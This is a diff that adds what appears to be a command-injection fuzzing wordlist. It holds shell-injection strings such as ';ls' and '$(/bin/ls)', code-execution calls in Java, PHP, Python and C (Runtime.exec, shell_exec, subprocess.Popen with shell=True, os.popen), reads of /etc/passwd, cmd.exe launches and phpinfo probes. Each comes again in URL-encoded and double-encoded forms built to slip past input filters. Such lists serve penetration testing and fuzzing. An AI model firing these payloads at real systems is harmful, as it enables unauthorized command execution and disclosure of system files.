@@ -1,0 +1,197 @@
+/bin/ls|
+\bin\ls|
+;ls
+;/bin/ls
+;\bin\ls
+%3Bcat%20/etc/passwd
+%3Bcat%20\etc\passwd
+/bin/ls|/bin/ls
+\bin\ls|\bin\ls
+/bin/ls
+\bin\ls
+$(/bin/ls)
+'/bin/ls'
+'\bin\ls'
+>(/bin/ls)
+>(\bin\ls)
+>(ls)
+<(/bin/ls)
+<(\bin\ls)
+<(ls)
+Runtime.getRuntime().exec("/bin/ls",null);
+Runtime.getRuntime().exec("\bin\ls",null);
+Runtime.getRuntime().exec("ls",null);
+Runtime.getRuntime().exec("/etc/passwd",null);
+Runtime.getRuntime().exec("\etc\passwd",null);
+Runtime.getRuntime().exec("cmd",null);
+Runtime.getRuntime().exec("C:\\windows\\system32\\cmd.exe",null);
+Runtime.getRuntime().exec("C:/windows/system32/cmd.exe",null);
+processBuilder.command("bash", "-c", "ls /etc/passwd");
+processBuilder.command("bash", "-c", "ls \etc\passwd");
+processBuilder.command("cmd.exe", "/c", "dir C:\\");
+processBuilder.command("cmd.exe", "/c", "dir C:/");
+processBuilder.command("cmd.exe", "/c", "whoami");
+shell_exec('ls');
+shell_exec('/bin/ls');
+shell_exec('\bin\ls');
+shell_exec('cmd.exe');
+shell_exec('c:\\windows\\system32\\cmd.exe');
+shell_exec('c:/windows/system32/cmd.exe');
+pclose(popen("start /B " . $command . " 1> $log 2>&1", "r"));
+subprocess.Popen('ls -la', shell=True)
+subprocess.Popen('/bin/ls -la', shell=True);
+subprocess.Popen('\bin\ls -la', shell=True);
+subprocess.Popen('cmd.exe', shell=True);
+subprocess.Popen('c:\\windows\\system32\\cmd.exe', shell=True);
+execlp("ls","ls", "-l", "/bin/??", (char *)NULL);
+execlp("ls","ls", "-l", "\bin\??", (char *)NULL);
+x=os.system('cat /etc/passwd/');print(x.read());
+x=os.system('/bin/ls');print(x.read());
+x=os.system('dir /');print(x.read());
+x=os.system('dir \\');print(x.read());
+p=os.popen('cat /etc/passwd/');print(p.read());
+p=os.popen('/bin/ls');print(p.read());
+p=os.popen('dir c:/');print(p.read());
+p=os.popen('dir c:\\');print(p.read());
+$connection=ssh2_connect('//localhost',+22);ssh2_exec($connection,+"cat /etc/passwd");
+$connection=ssh2_connect('//localhost',+22);ssh2_exec($connection,+"cat \etc\passwd");
+<?php+echo+$_SERVER['REMOTE_ADDR'];?>;
+<?php+phpinfo()?>
+%2Fbin%2Fls%7C%0A
+%5Cbin%5Cls%7C%0A
+%3Bls%0A
+%3B%2Fbin%2Fls%0A
+%3B%5Cbin%5Cls%0A
+%253Bcat%2520%2Fetc%2Fpasswd%0A
+%253Bcat%2520%5Cetc%5Cpasswd%0A
+%2Fbin%2Fls%7C%2Fbin%2Fls%0A
+%5Cbin%5Cls%7C%5Cbin%5Cls%0A
+%2Fbin%2Fls%0A
+%5Cbin%5Cls%0A
+%24%28%2Fbin%2Fls%29%0A
+%27%2Fbin%2Fls%27%0A
+%27%5Cbin%5Cls%27%0A
+%3E%28%2Fbin%2Fls%29%0A
+%3E%28%5Cbin%5Cls%29%0A
+%3E%28ls%29%0A
+%3C%28%2Fbin%2Fls%29%0A
+%3C%28%5Cbin%5Cls%29%0A
+%3C%28ls%29%0A
+Runtime.getRuntime%28%29.exec%28%22%2Fbin%2Fls%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22%5Cbin%5Cls%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22ls%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22%2Fetc%2Fpasswd%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22%5Cetc%5Cpasswd%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22cmd%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22C%3A%5C%5Cwindows%5C%5Csystem32%5C%5Ccmd.exe%22%2Cnull%29%3B%0A
+Runtime.getRuntime%28%29.exec%28%22C%3A%2Fwindows%2Fsystem32%2Fcmd.exe%22%2Cnull%29%3B%0A
+processBuilder.command%28%22bash%22%2C%20%22-c%22%2C%20%22ls%20%2Fetc%2Fpasswd%22%29%3B%0A
+processBuilder.command%28%22bash%22%2C%20%22-c%22%2C%20%22ls%20%5Cetc%5Cpasswd%22%29%3B%0A
+processBuilder.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20%22dir%20C%3A%5C%5C%22%29%3B%0A
+processBuilder.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20%22dir%20C%3A%2F%22%29%3B%0A
+processBuilder.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20%22whoami%22%29%3B%0A
+shell_exec%28%27ls%27%29%3B%0A
+shell_exec%28%27%2Fbin%2Fls%27%29%3B%0A
+shell_exec%28%27%5Cbin%5Cls%27%29%3B%0A
+shell_exec%28%27cmd.exe%27%29%3B%0A
+shell_exec%28%27c%3A%5C%5Cwindows%5C%5Csystem32%5C%5Ccmd.exe%27%29%3B%0A
+shell_exec%28%27c%3A%2Fwindows%2Fsystem32%2Fcmd.exe%27%29%3B%0A
+pclose%28popen%28%22start%20%2FB%20%22%20.%20%24command%20.%20%22%201%3E%20%24log%202%3E%261%22%2C%20%22r%22%29%29%3B%0A
+subprocess.Popen%28%27ls%20-la%27%2C%20shell%3DTrue%29%0A
+subprocess.Popen%28%27%2Fbin%2Fls%20-la%27%2C%20shell%3DTrue%29%3B%0A
+subprocess.Popen%28%27%5Cbin%5Cls%20-la%27%2C%20shell%3DTrue%29%3B%0A
+subprocess.Popen%28%27cmd.exe%27%2C%20shell%3DTrue%29%3B%0A
+subprocess.Popen%28%27c%3A%5C%5Cwindows%5C%5Csystem32%5C%5Ccmd.exe%27%2C%20shell%3DTrue%29%3B%0A
+execlp%28%22ls%22%2C%22ls%22%2C%20%22-l%22%2C%20%22%2Fbin%2F%3F%3F%22%2C%20%28char%20%2A%29NULL%29%3B%0A
+execlp%28%22ls%22%2C%22ls%22%2C%20%22-l%22%2C%20%22%5Cbin%5C%3F%3F%22%2C%20%28char%20%2A%29NULL%29%3B%0A
+x%3Dos.system%28%27cat%20%2Fetc%2Fpasswd%2F%27%29%3Bprint%28x.read%28%29%29%3B%0A
+x%3Dos.system%28%27%2Fbin%2Fls%27%29%3Bprint%28x.read%28%29%29%3B%0A
+x%3Dos.system%28%27dir%20%2F%27%29%3Bprint%28x.read%28%29%29%3B%0A
+x%3Dos.system%28%27dir%20%5C%5C%27%29%3Bprint%28x.read%28%29%29%3B%0A
+p%3Dos.popen%28%27cat%20%2Fetc%2Fpasswd%2F%27%29%3Bprint%28p.read%28%29%29%3B%0A
+p%3Dos.popen%28%27%2Fbin%2Fls%27%29%3Bprint%28p.read%28%29%29%3B%0A
+p%3Dos.popen%28%27dir%20c%3A%2F%27%29%3Bprint%28p.read%28%29%29%3B%0A
+p%3Dos.popen%28%27dir%20c%3A%5C%5C%27%29%3Bprint%28p.read%28%29%29%3B%0A
+%24connection%3Dssh2_connect%28%27%2F%2Flocalhost%27%2C%2B22%29%3Bssh2_exec%28%24connection%2C%2B%22cat%20%2Fetc%2Fpasswd%22%29%3B%0A
+%24connection%3Dssh2_connect%28%27%2F%2Flocalhost%27%2C%2B22%29%3Bssh2_exec%28%24connection%2C%2B%22cat%20%5Cetc%5Cpasswd%22%29%3B%0A
+%3C%3Fphp%2Becho%2B%24_SERVER%5B%27REMOTE_ADDR%27%5D%3B%3F%3E%3B%0A
+%3C%3Fphp%2Bphpinfo%28%29%3F%3E%0A
+\/bin/ls%257C%250A%0A
+%255Cbin%255Cls%257C%250A%0A
+;ls%250A%0A
+;/bin/ls%250A%0A
+;%255Cbin%255Cls%250A%0A
+%25253Bcat%252520/etc/passwd%250A%0A
+%25253Bcat%252520%255Cetc%255Cpasswd%250A%0A
+/bin/ls%257C/bin/ls%250A%0A
+%255Cbin%255Cls%257C%255Cbin%255Cls%250A%0A
+/bin/ls%250A%0A
+%255Cbin%255Cls%250A%0A
+$(/bin/ls)%250A%0A
+'/bin/ls'%250A%0A
+'%255Cbin%255Cls'%250A%0A
+%253E(/bin/ls)%250A%0A
+%253E(%255Cbin%255Cls)%250A%0A
+%253E(ls)%250A%0A
+%253C(/bin/ls)%250A%0A
+%253C(%255Cbin%255Cls)%250A%0A
+%253C(ls)%250A%0A
+%252Fbin%252Fls%257C%250A%0A
+%255Cbin%255Cls%257C%250A%0A
+%253Bls%250A%0A
+%253B%252Fbin%252Fls%250A%0A
+%253B%255Cbin%255Cls%250A%0A
+%25253Bcat%252520%252Fetc%252Fpasswd%250A%0A
+%25253Bcat%252520%255Cetc%255Cpasswd%250A%0A
+%252Fbin%252Fls%257C%252Fbin%252Fls%250A%0A
+%255Cbin%255Cls%257C%255Cbin%255Cls%250A%0A
+%252Fbin%252Fls%250A%0A
+%255Cbin%255Cls%250A%0A
+%2524%2528%252Fbin%252Fls%2529%250A%0A
+%2527%252Fbin%252Fls%2527%250A%0A
+%2527%255Cbin%255Cls%2527%250A%0A
+%253E%2528%252Fbin%252Fls%2529%250A%0A
+%253E%2528%255Cbin%255Cls%2529%250A%0A
+%253E%2528ls%2529%250A%0A
+%253C%2528%252Fbin%252Fls%2529%250A%0A
+%253C%2528%255Cbin%255Cls%2529%250A%0A
+%253C%2528ls%2529%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522%252Fbin%252Fls%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522%255Cbin%255Cls%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522ls%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522%252Fetc%252Fpasswd%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522%255Cetc%255Cpasswd%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522cmd%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522C%253A%255C%255Cwindows%255C%255Csystem32%255C%255Ccmd.exe%2522%252Cnull%2529%253B%250A%0A
+Runtime.getRuntime%2528%2529.exec%2528%2522C%253A%252Fwindows%252Fsystem32%252Fcmd.exe%2522%252Cnull%2529%253B%250A%0A
+processBuilder.command%2528%2522bash%2522%252C%2520%2522-c%2522%252C%2520%2522ls%2520%252Fetc%252Fpasswd%2522%2529%253B%250A%0A
+processBuilder.command%2528%2522bash%2522%252C%2520%2522-c%2522%252C%2520%2522ls%2520%255Cetc%255Cpasswd%2522%2529%253B%250A%0A
+processBuilder.command%2528%2522cmd.exe%2522%252C%2520%2522%252Fc%2522%252C%2520%2522dir%2520C%253A%255C%255C%2522%2529%253B%250A%0A
+processBuilder.command%2528%2522cmd.exe%2522%252C%2520%2522%252Fc%2522%252C%2520%2522dir%2520C%253A%252F%2522%2529%253B%250A%0A
+processBuilder.command%2528%2522cmd.exe%2522%252C%2520%2522%252Fc%2522%252C%2520%2522whoami%2522%2529%253B%250A%0A
+shell_exec%2528%2527ls%2527%2529%253B%250A%0A
+shell_exec%2528%2527%252Fbin%252Fls%2527%2529%253B%250A%0A
+shell_exec%2528%2527%255Cbin%255Cls%2527%2529%253B%250A%0A
+shell_exec%2528%2527cmd.exe%2527%2529%253B%250A%0A
+shell_exec%2528%2527c%253A%255C%255Cwindows%255C%255Csystem32%255C%255Ccmd.exe%2527%2529%253B%250A%0A
+shell_exec%2528%2527c%253A%252Fwindows%252Fsystem32%252Fcmd.exe%2527%2529%253B%250A%0A
+pclose%2528popen%2528%2522start%2520%252FB%2520%2522%2520.%2520%2524command%2520.%2520%2522%25201%253E%2520%2524log%25202%253E%25261%2522%252C%2520%2522r%2522%2529%2529%253B%250A%0A
+subprocess.Popen%2528%2527ls%2520-la%2527%252C%2520shell%253DTrue%2529%250A%0A
+subprocess.Popen%2528%2527%252Fbin%252Fls%2520-la%2527%252C%2520shell%253DTrue%2529%253B%250A%0A
+subprocess.Popen%2528%2527%255Cbin%255Cls%2520-la%2527%252C%2520shell%253DTrue%2529%253B%250A%0A
+subprocess.Popen%2528%2527cmd.exe%2527%252C%2520shell%253DTrue%2529%253B%250A%0A
+subprocess.Popen%2528%2527c%253A%255C%255Cwindows%255C%255Csystem32%255C%255Ccmd.exe%2527%252C%2520shell%253DTrue%2529%253B%250A%0A
+execlp%2528%2522ls%2522%252C%2522ls%2522%252C%2520%2522-l%2522%252C%2520%2522%252Fbin%252F%253F%253F%2522%252C%2520%2528char%2520%252A%2529NULL%2529%253B%250A%0A
+execlp%2528%2522ls%2522%252C%2522ls%2522%252C%2520%2522-l%2522%252C%2520%2522%255Cbin%255C%253F%253F%2522%252C%2520%2528char%2520%252A%2529NULL%2529%253B%250A%0A
+x%253Dos.system%2528%2527cat%2520%252Fetc%252Fpasswd%252F%2527%2529%253Bprint%2528x.read%2528%2529%2529%253B%250A%0A
+x%253Dos.system%2528%2527%252Fbin%252Fls%2527%2529%253Bprint%2528x.read%2528%2529%2529%253B%250A%0A
+x%253Dos.system%2528%2527dir%2520%252F%2527%2529%253Bprint%2528x.read%2528%2529%2529%253B%250A%0A
+x%253Dos.system%2528%2527dir%2520%255C%255C%2527%2529%253Bprint%2528x.read%2528%2529%2529%253B%250A%0A
+p%253Dos.popen%2528%2527cat%2520%252Fetc%252Fpasswd%252F%2527%2529%253Bprint%2528p.read%2528%2529%2529%253B%250A%0A
+p%253Dos.popen%2528%2527%252Fbin%252Fls%2527%2529%253Bprint%2528p.read%2528%2529%2529%253B%250A%0A
+p%253Dos.popen%2528%2527dir%2520c%253A%252F%2527%2529%253Bprint%2528p.read%2528%2529%2529%253B%250A%0A
+p%253Dos.popen%2528%2527dir%2520c%253A%255C%255C%2527%2529%253Bprint%2528p.read%2528%2529%2529%253B%250A%0A
+%2524connection%253Dssh2_connect%2528%2527%252F%252Flocalhost%2527%252C%252B22%2529%253Bssh2_exec%2528%2524connection%252C%252B%2522cat%2520%252Fetc%252Fpasswd%2522%2529%253B%250A%0A
+%2524connection%253Dssh2_connect%2528%2527%252F%252Flocalhost%2527%252C%252B22%2529%253Bssh2_exec%2528%2524connection%252C%252B%2522cat%2520%255Cetc%255Cpasswd%2522%2529%253B%250A%0A
+%253C%253Fphp%252Becho%252B%2524_SERVER%255B%2527REMOTE_ADDR%2527%255D%253B%253F%253E%253B%250A%0A
+%253C%253Fphp%252Bphpinfo%2528%2529%253F%253E%250A%0A
